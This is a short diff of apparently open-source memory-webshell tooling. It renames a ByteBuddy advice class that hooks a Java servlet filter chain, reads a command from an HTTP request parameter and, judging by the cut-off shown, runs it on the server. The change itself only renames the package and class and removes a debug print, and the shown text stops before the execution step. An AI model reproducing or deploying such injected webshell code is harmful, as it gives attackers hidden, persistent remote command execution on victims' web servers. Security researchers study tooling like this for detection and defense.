@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.tomcat.command;
+package com.reajason.javaweb.memshell.shelltool.command;
 
 import net.bytebuddy.asm.Advice;
 
@@ -10,7 +10,7 @@ import java.io.InputStream;
 /**
  * @author ReaJason
  */
-public class TomcatFilterChainCommandAdvisor {
+public class CommandFilterChainAdvisor {
     public static String paramName;
 
     @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
@@ -18,7 +18,6 @@ public class TomcatFilterChainCommandAdvisor {
             @Advice.Argument(value = 0) ServletRequest request,
             @Advice.Argument(value = 1) ServletResponse response
     ) {
-        System.out.println(paramName);
         String cmd = request.getParameter(paramName);
         try {
             if (cmd != null) {
